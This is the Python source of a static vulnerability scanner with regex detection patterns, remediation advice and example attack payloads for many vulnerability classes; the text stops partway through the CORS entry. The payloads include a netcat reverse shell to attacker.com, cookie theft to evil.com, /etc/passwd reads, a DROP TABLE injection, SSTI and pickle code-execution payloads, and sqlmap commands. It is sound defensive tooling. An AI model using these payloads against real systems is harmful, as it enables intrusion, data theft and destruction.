"""
Static code analyzer - context-aware vulnerability detection across multiple languages.

Improvements over v1:
- Context-aware XSS: skips pure string literals in innerHTML assignments
- Skips commented-out lines and test files
- Taint-aware patterns: checks if variable actually receives user input
- 18 vulnerability categories (was 11)
- Per-language extension filtering
- Deduplication within same finding type per file
- Confidence scoring to suppress low-confidence noise
"""

import os
import re
import time
from dataclasses import dataclass
from typing import Optional
from .base import BaseScanner, ScanResult, Finding, Severity, Category

# ── Constants ──────────────────────────────────────────────────────────────

SKIP_DIRS = {
    "node_modules", ".git", "__pycache__", ".venv", "venv", "env",
    "dist", "build", ".next", ".nuxt", "vendor", ".tox", "eggs",
    "site-packages", ".mypy_cache", ".pytest_cache", "coverage",
    "htmlcov", ".idea", ".vscode", "fixtures", "mocks", "__mocks__",
}

# Test file indicators — lower confidence, don't report LOW/MEDIUM
TEST_FILE_PATTERNS = re.compile(
    r"(?:test|spec|mock|fixture|stub|fake|dummy)s?[_\-\./]|[_\-\./](?:test|spec)s?\b",
    re.IGNORECASE,
)

BINARY_EXTENSIONS = {
    ".png", ".jpg", ".jpeg", ".gif", ".ico", ".bmp", ".svg", ".woff",
    ".woff2", ".ttf", ".eot", ".otf", ".mp3", ".mp4", ".avi", ".mov",
    ".zip", ".tar", ".gz", ".rar", ".7z", ".exe", ".dll", ".so",
    ".pyc", ".pyo", ".class", ".pdf", ".min.js", ".min.css",
}

MAX_FILE_SIZE = 500_000  # 500 KB

# ── Taint sources: expressions that receive user input ─────────────────────
# Used to validate that data flowing into sinks is actually user-controlled

TAINT_SOURCES = re.compile(
    r"""(?x)
    request\s*[\.\[]\s*(?:get|post|form|json|args|data|params|files|values|cookies|headers|body)
    | req\s*\.\s*(?:body|params|query|headers|cookies|files)
    | \$_(?:GET|POST|REQUEST|COOKIE|FILES|SERVER)
    | params\s*\[
    | argv\s*\[
    | os\.environ\.get
    | input\s*\(
    | sys\.stdin
    | getParameter\s*\(
    | window\.location
    | document\.(?:URL|referrer|cookie|location)
    | location\.(?:search|hash|href|pathname)
    | localStorage\.|sessionStorage\.
    | URLSearchParams
    """,
    re.IGNORECASE,
)

# Pure string literal — value that cannot be user-controlled
PURE_STRING_LITERAL = re.compile(
    r"""^[\s\w$.]*\s*=\s*[`'"]\s*<[^'"]+>[`'"]"""
)

# ── Vulnerability Patterns ─────────────────────────────────────────────────

@dataclass
class VulnPattern:
    id: str
    title: str
    patterns: list  # compiled regexes
    extensions: set
    severity: Severity
    category: Category
    cwe: str
    description: str
    recommendation: str
    attack: str
    # Optional: patterns that SUPPRESS this finding (false positive guards)
    suppress: list = None
    # Only report if one of these taint sources appears in context window (N lines)
    require_taint: bool = False
    taint_window: int = 10


def _r(*patterns):
    return [re.compile(p, re.IGNORECASE | re.VERBOSE) for p in patterns]


VULNERABILITY_PATTERNS: list[VulnPattern] = [

    # ── INJECTION ──────────────────────────────────────────────────────────

    VulnPattern(
        id="sql_injection_concat",
        title="SQL Injection via String Concatenation",
        patterns=_r(
            r"""(?:execute|cursor\.execute|query|db\.execute|conn\.execute)\s*\(\s*(?:f['"]|['"].*(?:\+|\%s|\{))""",
            r"""(?:executeQuery|createStatement|prepareStatement)\s*\(\s*['"].*\+""",
            r"""(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\s+\w.*\+\s*\w""",
            r"""(?:raw|RawSQL)\s*\(\s*(?:f['"]|['"].*\+|.*\.format)""",
        ),
        suppress=_r(
            r"""[#].*(?:SELECT|INSERT|UPDATE|DELETE)""",
            r"""['"].*(?:SELECT|INSERT|UPDATE|DELETE).*['"]""",
        ),
        extensions={".py", ".js", ".ts", ".php", ".java", ".rb", ".go", ".cs", ".cpp"},
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        cwe="CWE-89",
        description="User input is concatenated directly into an SQL query without parameterization, allowing injection of arbitrary SQL.",
        recommendation=(
            "Use parameterized queries or prepared statements:\n"
            "  Python:  cursor.execute('SELECT * FROM t WHERE id=%s', [user_id])\n"
            "  Node.js: db.query('SELECT * FROM t WHERE id=?', [userId])\n"
            "  Java:    PreparedStatement ps = conn.prepareStatement('SELECT * FROM t WHERE id=?')"
        ),
        attack=(
            "Payload: ' OR '1'='1' --\n"
            "Effect: Bypasses WHERE clause, returns all rows (authentication bypass)\n"
            "Payload: '; DROP TABLE users; --\n"
            "Effect: Destroys table data\n"
            "Tool: sqlmap -u 'https://target/api?id=1' --dbs --batch"
        ),
        require_taint=False,
    ),

    VulnPattern(
        id="sql_injection_format",
        title="SQL Injection via String Formatting",
        patterns=_r(
            r"""['"](?:SELECT|INSERT|UPDATE|DELETE|EXEC|CALL)\b[^'"]*['"]\.format\s*\(""",
            r"""f['"](?:SELECT|INSERT|UPDATE|DELETE|EXEC)\s+.*\{""",
            r"""%\s*(?:s|d)\s*.*(?:SELECT|INSERT|UPDATE|DELETE)""",
        ),
        extensions={".py", ".js", ".ts", ".php", ".java", ".rb", ".go"},
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        cwe="CWE-89",
        description="String formatting used to build SQL queries allows injection when format arguments contain user input.",
        recommendation="Replace string formatting with parameterized queries. Never use .format(), f-strings, or % interpolation to build SQL.",
        attack="Payload inside format argument: ' UNION SELECT username,password FROM users--",
        require_taint=False,
    ),

    VulnPattern(
        id="command_injection",
        title="OS Command Injection",
        patterns=_r(
            r"""os\.(?:system|popen|execv?e?p?)\s*\([^)]*(?:\+|format|f['"]|\{)""",
            r"""subprocess\.(?:call|run|Popen|check_output|check_call)\s*\([^)]*shell\s*=\s*True""",
            r"""(?:exec|system|passthru|shell_exec|popen|proc_open)\s*\(\s*\$""",
            r"""child_process\.exec\s*\([^)]*(?:\+|`\$\{|\$\()""",
            r"""Runtime\.getRuntime\(\)\.exec\s*\([^)]*\+""",
        ),
        extensions={".py", ".js", ".ts", ".php", ".rb", ".java", ".go", ".sh"},
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        cwe="CWE-78",
        description="User-controlled data is passed to an OS command execution function, enabling arbitrary command execution on the server.",
        recommendation=(
            "- Never use shell=True with user input\n"
            "- Pass command as a list: subprocess.run(['ls', user_dir], shell=False)\n"
            "- Validate input against a strict allowlist\n"
            "- Use shlex.quote() if shell string is unavoidable"
        ),
        attack=(
            "Payload: ; cat /etc/passwd\n"
            "Payload: | nc attacker.com 4444 -e /bin/bash\n"
            "Effect: Remote shell, data exfiltration, privilege escalation"
        ),
        require_taint=False,
    ),

    VulnPattern(
        id="code_injection_eval",
        title="Code Injection via eval/exec",
        patterns=_r(
            r"""\beval\s*\((?!.*JSON\.parse)[^)]*(?:request|input|params|argv|user|body|query|data)""",
            r"""\bexec\s*\([^)]*(?:request|input|params|argv|user|body|query|data)""",
            r"""new\s+Function\s*\([^)]*(?:\+|request|params|query|body)""",
        ),
        extensions={".py", ".js", ".ts", ".php", ".rb"},
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        cwe="CWE-94",
        description="Dynamic code execution with user-controlled input allows arbitrary code to run on the server.",
        recommendation="Never pass user input to eval/exec. Use ast.literal_eval() for Python data parsing, JSON.parse() for JS.",
        attack="Payload: __import__('os').system('id')\nEffect: Remote Code Execution as the web server user",
    ),

    VulnPattern(
        id="ssti",
        title="Server-Side Template Injection (SSTI)",
        patterns=_r(
            r"""render_template_string\s*\([^)]*(?:request|input|params|user|f['"].*\{)""",
            r"""Template\s*\([^)]*(?:request|input|params|user)\s*\)""",
            r"""env\.from_string\s*\([^)]*(?:request|input|user)""",
            r"""\.render\s*\(\s*\w+\s*=\s*(?:request|input|params)""",
        ),
        extensions={".py", ".js", ".ts", ".rb", ".php", ".java"},
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        cwe="CWE-1336",
        description="User input is passed directly to a template engine, which can execute arbitrary code via template syntax.",
        recommendation=(
            "- Never pass user input to render_template_string() or Template()\n"
            "- Use render_template() with fixed template files\n"
            "- If dynamic templates are needed, use sandboxed environments"
        ),
        attack=(
            "Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
            "Effect: Remote Code Execution\n"
            "Tool: tplmap -u 'https://target/page?name=FUZZ'"
        ),
    ),

    VulnPattern(
        id="ldap_injection",
        title="LDAP Injection",
        patterns=_r(
            r"""ldap(?:\.search|\.modify|\.add|\.delete|3\.search_s)\s*\([^)]*(?:\+|format|f['"]|\{)""",
            r"""(?:ldap_search|ldap_bind)\s*\([^)]*(?:\$_GET|\$_POST|\$_REQUEST)""",
            r"""Filter\.create\s*\([^)]*\+""",
        ),
        extensions={".py", ".js", ".ts", ".php", ".java", ".rb"},
        severity=Severity.HIGH,
        category=Category.INJECTION,
        cwe="CWE-90",
        description="User input concatenated into LDAP query strings allows manipulation of directory queries.",
        recommendation="Use LDAP escaping functions (ldap3.utils.conv.escape_filter_chars) or parameterized LDAP libraries.",
        attack=(
            "Payload: *)(uid=*))(|(uid=*\n"
            "Effect: Authentication bypass, directory data extraction"
        ),
    ),

    VulnPattern(
        id="nosql_injection",
        title="NoSQL Injection",
        patterns=_r(
            r"""\.find\s*\(\s*\{[^}]*(?:request|params|query|body|input)[^}]*\}""",
            r"""\.findOne\s*\(\s*\{[^}]*(?:request|params|query|body)[^}]*\}""",
            r"""db\.collection\s*\([^)]*\)\.(?:find|update|delete)\s*\(\s*(?:req\.|request\.)""",
            r"""\$where\s*:\s*['"]?(?:function|\w+)\s*\(""",
        ),
        extensions={".js", ".ts", ".py", ".java", ".go"},
        severity=Severity.HIGH,
        category=Category.INJECTION,
        cwe="CWE-943",
        description="User input directly embedded in NoSQL query objects can manipulate query logic.",
        recommendation=(
            "- Validate and whitelist query fields\n"
            "- Use MongoDB schema validation\n"
            "- Never pass req.body/req.query directly as a filter object\n"
            "- Strip operator keys ($where, $gt, $ne) from user input"
        ),
        attack=(
            "Payload: {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n"
            "Effect: Authentication bypass — logs in without valid credentials"
        ),
    ),

    VulnPattern(
        id="xxe",
        title="XML External Entity (XXE) Injection",
        patterns=_r(
            r"""(?:etree|ElementTree|minidom|SAXParser|XMLParser)\s*\(""",
            r"""xml\.(?:etree|dom|sax|parsers)\.\w+\s*\.""",
            r"""DocumentBuilderFactory\.newInstance\s*\(\s*\)""",
            r"""XMLReader\s*\.\s*parse\s*\(""",
            r"""simplexml_load_(?:string|file)\s*\(""",
        ),
        suppress=_r(r"""defusedxml""", r"""XMLParser\s*\(.*resolve_entities\s*=\s*False"""),
        extensions={".py", ".js", ".ts", ".java", ".php", ".rb", ".cs"},
        severity=Severity.HIGH,
        category=Category.INJECTION,
        cwe="CWE-611",
        description="XML parser may process external entity references, allowing file disclosure or SSRF.",
        recommendation=(
            "Python: Use defusedxml library instead of xml.etree\n"
            "Java:   factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
            "PHP:    libxml_disable_entity_loader(true)"
        ),
        attack=(
            "Payload: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\n"
            "Effect: Server reads and returns /etc/passwd content"
        ),
    ),

    # ── XSS ───────────────────────────────────────────────────────────────

    VulnPattern(
        id="xss_innerhtml",
        title="XSS via innerHTML with Dynamic Content",
        patterns=_r(
            r"""innerHTML\s*=\s*(?!['"`]\s*<[^`'"]*>\s*['"`])[^;]*(?:\w+\s*\+|\$\{|\.value|request|query|params|location|URL|search|hash|cookie)""",
            r"""outerHTML\s*=\s*[^;]*(?:\+|\$\{|\w+\.value|location)""",
            r"""insertAdjacentHTML\s*\([^,]+,\s*[^)]*(?:\+|\$\{|\w+\.value)""",
        ),
        extensions={".js", ".ts", ".jsx", ".tsx", ".html", ".vue"},
        severity=Severity.HIGH,
        category=Category.XSS,
        cwe="CWE-79",
        description="Dynamic content assigned to innerHTML without sanitization allows script injection when the source contains user-controlled data.",
        recommendation=(
            "- Use textContent for plain text: element.textContent = userValue\n"
            "- Sanitize with DOMPurify: element.innerHTML = DOMPurify.sanitize(userValue)\n"
            "- Use document.createElement() + appendChild() for structured content"
        ),
        attack=(
            "Payload: <img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>\n"
            "Effect: Cookie theft → session hijacking"
        ),
    ),

    VulnPattern(
        id="xss_document_write",
        title="XSS via document.write",
        patterns=_r(
            r"""document\.write\s*\([^)]*(?:location|query|param|search|hash|cookie|\+\s*\w)""",
            r"""document\.writeln\s*\([^)]*(?:location|query|param|search|\+\s*\w)""",
        ),
        extensions={".js", ".ts", ".html"},
        severity=Severity.HIGH,
        category=Category.XSS,
        cwe="CWE-79",
        description="document.write() with dynamic content is a classic XSS vector. The browser parses the written content as HTML.",
        recommendation="Avoid document.write() entirely. Use DOM manipulation methods (createElement, textContent) instead.",
        attack="Payload injected via URL parameter rendered with document.write() executes arbitrary JavaScript.",
    ),

    VulnPattern(
        id="xss_react_dangerous",
        title="XSS via dangerouslySetInnerHTML",
        patterns=_r(
            r"""dangerouslySetInnerHTML\s*=\s*\{\s*\{[^}]*(?:\w+\s*\+|\$\{|props\.|state\.|[a-z]+Data)""",
            r"""dangerouslySetInnerHTML=\{\{__html:\s*(?!DOMPurify)""",
        ),
        extensions={".jsx", ".tsx", ".js", ".ts"},
        severity=Severity.HIGH,
        category=Category.XSS,
        cwe="CWE-79",
        description="dangerouslySetInnerHTML without sanitization enables XSS when the content includes user data.",
        recommendation="Wrap the value with DOMPurify.sanitize() before passing to dangerouslySetInnerHTML.",
        attack="If the __html value includes user content, attackers inject <script> tags or event handlers.",
    ),

    VulnPattern(
        id="xss_server_reflected",
        title="Reflected XSS in Server-Side Template",
        patterns=_r(
            r"""mark_safe\s*\([^)]*(?:request|params|input|user|query)""",
            r"""\|\s*safe\b[^#\n]*(?:request|param|input|user|query)""",
            r"""<%=\s*(?!.*(?:h\b|html_escape|sanitize|escape))[^%]*(?:params|request|input)\s*%>""",
            r"""\{!!\s*(?!.*(?:e\(|htmlspecialchars|htmlentities|esc))[^}]*(?:request|input|user|query)""",
        ),
        extensions={".py", ".rb", ".php", ".erb", ".html", ".blade.php"},
        severity=Severity.HIGH,
        category=Category.XSS,
        cwe="CWE-79",
        description="Server-side template renders user input as raw HTML using an unsafe bypass.",
        recommendation=(
            "- Django: Never use mark_safe() on user-controlled values\n"
            "- Rails: Use html_escape() / ERB auto-escaping\n"
            "- Laravel: Use {{ $var }} not {!! $var !!} for user content"
        ),
        attack="Attacker submits payload in a form field; the server reflects it unescaped in the response HTML.",
    ),

    # ── PATH TRAVERSAL ─────────────────────────────────────────────────────

    VulnPattern(
        id="path_traversal",
        title="Path Traversal / Local File Inclusion",
        patterns=_r(
            r"""(?:open|read|readFile|createReadStream|FileInputStream|send_file|send_from_directory)\s*\([^)]*(?:request\.|req\.|params\[|args\.|query\[|form\[)""",
            r"""os\.path\.join\s*\([^)]*(?:request|params|args|query|input|user)""",
            r"""Path\s*\([^)]*(?:request|params|args|query)\s*\)""",
            r"""include\s*\(\s*\$_(?:GET|POST|REQUEST)""",
            r"""require\s*\(\s*\$_(?:GET|POST|REQUEST)""",
        ),
        extensions={".py", ".js", ".ts", ".php", ".java", ".rb", ".go"},
        severity=Severity.HIGH,
        category=Category.FILE_INCLUSION,
        cwe="CWE-22",
        description="User-controlled input used in file path construction without sanitization allows reading arbitrary files.",
        recommendation=(
            "- Resolve the full path and verify it starts with the intended base directory:\n"
            "  real = os.path.realpath(os.path.join(base_dir, user_input))\n"
            "  if not real.startswith(base_dir): raise PermissionError\n"
            "- Use an allowlist of permitted filenames"
        ),
        attack=(
            "GET /download?file=../../etc/passwd\n"
            "GET /download?file=..%2F..%2Fetc%2Fshadow\n"
            "Effect: Reads sensitive server files"
        ),
    ),

    # ── SSRF ──────────────────────────────────────────────────────────────

    VulnPattern(
        id="ssrf",
        title="Server-Side Request Forgery (SSRF)",
        patterns=_r(
            r"""(?:requests\.(?:get|post|put|delete|head|request)|urllib\.request\.urlopen|httpx\.(?:get|post)|aiohttp\.ClientSession)\s*\([^)]*(?:request\.|req\.|params\[|args\.|query\[|form\[|input|user)""",
            r"""(?:fetch|axios\.(?:get|post|put|request)|http\.(?:get|request))\s*\([^)]*(?:req\.|request\.|params\.|query\.|body\.)""",
            r"""curl_setopt\s*\([^,]+,\s*CURLOPT_URL\s*,\s*\$_""",
        ),
        extensions={".py", ".js", ".ts", ".java", ".php", ".rb", ".go"},
        severity=Severity.HIGH,
        category=Category.SSRF,
        cwe="CWE-918",
        description="Server makes HTTP requests to URLs controlled by user input, enabling access to internal services.",
        recommendation=(
            "- Validate URL against an allowlist of permitted hosts/schemes\n"
            "- Block requests to private IP ranges (127.x, 10.x, 172.16-31.x, 192.168.x)\n"
            "- Use a URL parser to verify scheme (allow only https://)\n"
            "- Disable redirects or validate the redirect destination"
        ),
        attack=(
            "Payload: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "Effect: Leaks AWS IAM credentials from instance metadata\n"
            "Payload: url=http://internal-db:5432\n"
            "Effect: Port scanning internal network"
        ),
    ),

    # ── CRYPTO ────────────────────────────────────────────────────────────

    VulnPattern(
        id="weak_hash",
        title="Weak Hashing Algorithm (MD5/SHA1)",
        patterns=_r(
            r"""hashlib\s*\.\s*(?:md5|sha1)\s*\(""",
            r"""(?:MD5|SHA1)\s*\.\s*(?:hexdigest|digest|update|new)\s*\(""",
            r"""crypto\.createHash\s*\(\s*['"](?:md5|sha1)['"]""",
            r"""MessageDigest\.getInstance\s*\(\s*['"](?:MD5|SHA-?1)['"]""",
            r"""CryptoJS\.MD5\s*\(|CryptoJS\.SHA1\s*\(""",
        ),
        suppress=_r(r"""[#].*(?:md5|sha1)""", r"""//.*(?:md5|sha1)"""),
        extensions={".py", ".js", ".ts", ".java", ".php", ".rb", ".go", ".cs"},
        severity=Severity.MEDIUM,
        category=Category.CRYPTO,
        cwe="CWE-327",
        description="MD5 and SHA-1 are cryptographically broken and vulnerable to collision and preimage attacks. Unsuitable for any security-sensitive use.",
        recommendation=(
            "Password hashing: bcrypt, scrypt, or argon2\n"
            "Data integrity:   SHA-256 or SHA-3\n"
            "Python:  hashlib.sha256(data).hexdigest()\n"
            "Node.js: crypto.createHash('sha256').update(data).digest('hex')"
        ),
        attack=(
            "MD5 rainbow tables can crack common passwords in seconds\n"
            "SHA-1 collision found in 2017 (SHAttered attack)\n"
            "Tool: hashcat -a 0 -m 0 hashes.txt wordlist.txt"
        ),
    ),

    VulnPattern(
        id="weak_cipher",
        title="Weak Cipher (DES/RC4/3DES)",
        patterns=_r(
            r"""\b(?:DES|RC4|RC2|Blowfish|3DES|TripleDES)\s*\(""",
            r"""Cipher\.getInstance\s*\(\s*['"](?:DES|RC4|Blowfish)""",
            r"""createCipheriv\s*\(\s*['"](?:des|rc4|bf|blowfish)""",
            r"""OpenSSL::Cipher::(?:DES|RC4|BF)""",
        ),
        extensions={".py", ".js", ".ts", ".java", ".php", ".rb", ".go", ".cs"},
        severity=Severity.HIGH,
        category=Category.CRYPTO,
        cwe="CWE-327",
        description="DES (56-bit key) and RC4 are broken ciphers. 3DES is deprecated. All are unsuitable for new code.",
        recommendation="Use AES-256-GCM for symmetric encryption. AES-256-CBC is acceptable if AEAD is unavailable.",
        attack="DES can be brute-forced in <1 day. RC4 has known keystream biases used to break TLS (BEAST, RC4 attacks).",
    ),

    VulnPattern(
        id="insecure_random",
        title="Cryptographically Insecure Random Number Generator",
        patterns=_r(
            r"""(?:random\.random|random\.randint|random\.choice|random\.shuffle)\s*\(""",
            r"""Math\.random\s*\(\s*\)""",
            r"""new\s+Random\s*\(\s*\)(?!\s*\.next(?:Int|Long|Bytes))""",
        ),
        suppress=_r(r"""[#].*random""", r"""//.*random""", r"""test|spec|mock|sample|demo|example"""),
        extensions={".py", ".js", ".ts", ".java", ".rb", ".go"},
        severity=Severity.MEDIUM,
        category=Category.CRYPTO,
        cwe="CWE-338",
        description="Standard random number generators are not cryptographically secure and are predictable given enough output.",
        recommendation=(
            "Token/secret generation:\n"
            "  Python:  secrets.token_hex(32)\n"
            "  Node.js: crypto.randomBytes(32).toString('hex')\n"
            "  Java:    SecureRandom.getInstanceStrong()"
        ),
        attack="Predictable token generation allows attackers to guess password-reset tokens, session IDs, or CSRF tokens.",
    ),

    # ── BROKEN AUTH ───────────────────────────────────────────────────────

    VulnPattern(
        id="hardcoded_password",
        title="Hardcoded Password or Secret",
        patterns=_r(
            r"""(?:password|passwd|pwd|secret|api_key|apikey|token|auth_token|access_token|private_key)\s*=\s*['"][^'"]{6,}['"]""",
            r"""(?:PASSWORD|SECRET|API_KEY|TOKEN|PRIVATE_KEY)\s*=\s*['"][^'"]{6,}['"]""",
        ),
        suppress=_r(
            r"""(?:password|secret|token|key)\s*=\s*['"](?:your_|<|{|example|placeholder|changeme|xxx|test|dummy|sample|none|null|false|true|)""",
            r"""[#]\s*(?:password|secret)""",
            r"""//\s*(?:password|secret)""",
            r"""(?:password|secret)\s*=\s*(?:os\.environ|getenv|config\.|settings\.|env\.)""",
        ),
        extensions={".py", ".js", ".ts", ".java", ".rb", ".go", ".php", ".cs", ".yml", ".yaml", ".json", ".cfg", ".ini", ".conf", ".env"},
        severity=Severity.HIGH,
        category=Category.SENSITIVE_DATA,
        cwe="CWE-798",
        description="Credentials are hardcoded in source code. If the repository is exposed, attackers gain immediate access.",
        recommendation=(
            "- Use environment variables: os.environ.get('DB_PASSWORD')\n"
            "- Use a secrets manager: AWS Secrets Manager, Vault, GCP Secret Manager\n"
            "- Rotate any exposed credential immediately\n"
            "- Add .env to .gitignore"
        ),
        attack="Attacker reads source code (public repo, leaked backup) and extracts credentials to access databases, APIs, or cloud accounts.",
    ),

    VulnPattern(
        id="jwt_insecure",
        title="Insecure JWT Configuration",
        patterns=_r(
            r"""(?:algorithm|algorithms)\s*=\s*['"]none['"]""",
            r"""options\s*=\s*\{[^}]*['"]verify_signature['"]\s*:\s*False""",
            r"""jwt\.decode\s*\([^)]*verify\s*=\s*False""",
            r"""(?:verify_exp|verify_signature|verify_aud)\s*=\s*False""",
            r"""algorithms\s*=\s*\[[^\]]*['"](?:none|HS256)['"]\s*,\s*['"](?:RS256|RS512)['"]""",
        ),
        extensions={".py", ".js", ".ts", ".java", ".rb", ".go", ".php"},
        severity=Severity.CRITICAL,
        category=Category.BROKEN_AUTH,
        cwe="CWE-345",
        description="JWT signature verification is disabled or the 'none' algorithm is accepted, allowing token forgery.",
        recommendation=(
            "- Always verify signatures: jwt.decode(token, key, algorithms=['HS256'])\n"
            "- Never accept 'none' as a valid algorithm\n"
            "- Use an explicit algorithm whitelist\n"
            "- Validate expiry (exp) and audience (aud) claims"
        ),
        attack=(
            "Attacker decodes JWT header, changes algorithm to 'none', removes signature\n"
            "Modified token: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\n"
            "Effect: Bypasses authentication, can forge any user identity"
        ),
    ),

    # ── INSECURE DESERIALIZATION ──────────────────────────────────────────

    VulnPattern(
        id="pickle_deserialization",
        title="Insecure Pickle Deserialization",
        patterns=_r(
            r"""pickle\.loads?\s*\(""",
            r"""cPickle\.loads?\s*\(""",
            r"""shelve\.open\s*\(""",
        ),
        extensions={".py"},
        severity=Severity.CRITICAL,
        category=Category.INSECURE_DESERIALIZATION,
        cwe="CWE-502",
        description="pickle.load() on untrusted data allows remote code execution. Pickle is not safe for external data.",
        recommendation=(
            "- Never deserialize pickle data from external sources\n"
            "- Use JSON, MessagePack, or Protocol Buffers for data exchange\n"
            "- If pickle is unavoidable, sign and verify data with HMAC before deserializing"
        ),
        attack=(
            "import pickle, os\n"
            "class Exploit(object):\n"
            "    def __reduce__(self): return os.system, ('id',)\n"
            "payload = pickle.dumps(Exploit())\n"
            "# Sending payload to pickle.loads() executes arbitrary code"
        ),
    ),

    VulnPattern(
        id="yaml_load",
        title="Unsafe YAML Deserialization",
        patterns=_r(
            r"""yaml\.load\s*\([^)]*(?!Loader\s*=\s*yaml\.(?:Safe|Base)Loader)""",
        ),
        suppress=_r(r"""yaml\.safe_load\s*\(""", r"""Loader\s*=\s*yaml\.SafeLoader"""),
        extensions={".py"},
        severity=Severity.HIGH,
        category=Category.INSECURE_DESERIALIZATION,
        cwe="CWE-502",
        description="yaml.load() without SafeLoader can execute arbitrary Python code embedded in YAML documents.",
        recommendation="Replace yaml.load() with yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader)",
        attack=(
            "Malicious YAML:\n"
            "!!python/object/apply:os.system ['id']\n"
            "Effect: Executes system command when parsed"
        ),
    ),

    # ── OPEN REDIRECT ─────────────────────────────────────────────────────

    VulnPattern(
        id="open_redirect",
        title="Open Redirect",
        patterns=_r(
            r"""(?:redirect|redirect_to|location\.href|window\.location)\s*[=(]\s*[^;]*(?:request\.|req\.|params\[|args\.|query\[|form\[|input)""",
            r"""header\s*\(\s*['"]Location:\s*['"]\s*\.\s*\$_""",
            r"""res\.redirect\s*\([^)]*(?:req\.|params\.|query\.|body\.)""",
            r"""return\s+redirect\s*\([^)]*(?:request\.|args\.|params\.)""",
        ),
        extensions={".py", ".js", ".ts", ".php", ".rb", ".java", ".go"},
        severity=Severity.MEDIUM,
        category=Category.BROKEN_ACCESS,
        cwe="CWE-601",
        description="The application redirects users to URLs from request parameters without validation, enabling phishing attacks.",
        recommendation=(
            "- Validate redirect URLs against an allowlist of trusted domains\n"
            "- Use relative URLs only: redirect('/dashboard')\n"
            "- If external redirects are needed, require user confirmation"
        ),
        attack=(
            "Payload: GET /login?next=https://evil.com/phishing\n"
            "Effect: After login, user is silently redirected to attacker's phishing page"
        ),
    ),

    # ── PROTOTYPE POLLUTION ───────────────────────────────────────────────

    VulnPattern(
        id="prototype_pollution",
        title="Prototype Pollution",
        patterns=_r(
            r"""(?:merge|extend|deepMerge|assign|clone|defaults)\s*\([^)]*(?:req\.|request\.|params\.|query\.|body\.)""",
            r"""for\s*\(\s*(?:const|let|var)?\s*\w+\s+in\s+(?:req\.|request\.|params\.|query\.|body\.)""",
            r"""\[\s*['"]\s*__proto__\s*['"]\s*\]""",
            r"""Object\.assign\s*\(\s*\w+\s*,\s*(?:req\.|request\.|params\.|query\.|body\.)""",
        ),
        extensions={".js", ".ts", ".jsx", ".tsx"},
        severity=Severity.HIGH,
        category=Category.INJECTION,
        cwe="CWE-1321",
        description="User-controlled keys merged into objects can pollute Object.prototype, affecting all objects in the application.",
        recommendation=(
            "- Validate user-supplied keys against an allowlist before merging\n"
            "- Use Object.create(null) for dictionaries to avoid prototype chain\n"
            "- Use libraries patched against prototype pollution (lodash>=4.17.21)\n"
            "- Freeze Object.prototype in critical code paths"
        ),
        attack=(
            "Payload: {\"__proto__\": {\"isAdmin\": true}}\n"
            "Effect: Sets isAdmin=true on all objects, bypassing authorization checks"
        ),
    ),

    # ── SECURITY MISCONFIG ────────────────────────────────────────────────

    VulnPattern(
        id="debug_mode",
        title="Debug Mode Enabled in Configuration",
        patterns=_r(
            r"""DEBUG\s*=\s*True\b""",
            r"""app\.debug\s*=\s*True""",
            r"""(?:FLASK_|DJANGO_)?DEBUG\s*=\s*['"]?(?:1|true|on|yes)\b""",
            r"""NODE_ENV\s*=\s*['"]development['"]""",
        ),
        suppress=_r(r"""[#].*DEBUG""", r"""//.*DEBUG"""),
        extensions={".py", ".js", ".ts", ".env", ".cfg", ".ini", ".yml", ".yaml", ".conf"},
        severity=Severity.MEDIUM,
        category=Category.SECURITY_MISCONFIG,
        cwe="CWE-489",
        description="Debug mode exposes stack traces, internal paths, environment variables, and interactive debuggers to any visitor.",
        recommendation=(
            "- Disable debug mode for production via environment variables\n"
            "- Use DEBUG = os.environ.get('DEBUG', 'false').lower() == 'true'\n"
            "- Never commit .env files with DEBUG=True"
        ),
        attack=(
            "Flask debug mode exposes the Werkzeug interactive debugger — attackers can execute\n"
            "arbitrary Python code via the browser console (no auth required)"
        ),
    ),

    VulnPattern(
        id="ssl_verification_disabled",
        title="SSL/TLS Certificate Verification Disabled",
        patterns=_r(
            r"""verify\s*=\s*False\b""",
            r"""VERIFY_SSL\s*=\s*False\b""",
            r"""rejectUnauthorized\s*:\s*false""",
            r"""InsecureSkipVerify\s*:\s*true""",
            r"""ssl\._create_unverified_context\s*\(""",
            r"""checkServerIdentity\s*:\s*\(\s*\)\s*=>\s*(?:null|undefined|\{\})""",
        ),
        extensions={".py", ".js", ".ts", ".go", ".java", ".rb"},
        severity=Severity.HIGH,
        category=Category.SECURITY_MISCONFIG,
        cwe="CWE-295",
        description="TLS certificate verification is disabled, making all HTTPS connections vulnerable to man-in-the-middle attacks.",
        recommendation=(
            "- Always keep verify=True (default in requests)\n"
            "- For self-signed certs in dev: use a proper CA or provide verify='path/to/ca.pem'\n"
            "- Never disable verification in production code"
        ),
        attack=(
            "Attacker uses mitmproxy between server and external service\n"
            "Effect: Intercepts all 'encrypted' traffic including credentials, API keys, sensitive data"
        ),
    ),

    VulnPattern(
        id="cors_wildcard",
        title="Overly Permissive CORS Policy",
        patterns=_r(
            r"""Access-Control-Allow-Origin['"\s]*:['"\s]*\*""",
            r"""CORS_ORIGIN_ALLOW_ALL\s*=\s*True""",
            r"""allow_origins\s*=\s*\[?\s*['"]?\*['"]?\]?""",
            r"""cors\s*\(\s*\{\s*origin\s*:\s*['"]?\*['"]?""",
            r"""app\.use\s*\(\s*cors\s*\(\s*\)\s*\)""",
        ),
        extensions={".py", ".js", ".ts", ".java", ".go", ".conf", ".yml", ".yaml"},
        severity=Severity.MEDIUM,
        category=Category.SECURITY_MISCONFIG,
        cwe="CWE-942",
        description="CORS configured with wildcard origin allows any website to make cross-origin requests with the user's credentials.",
        recommendation=(
            "- Specify exact allowed origins: allow_origins=['https://app.example.com']\n"
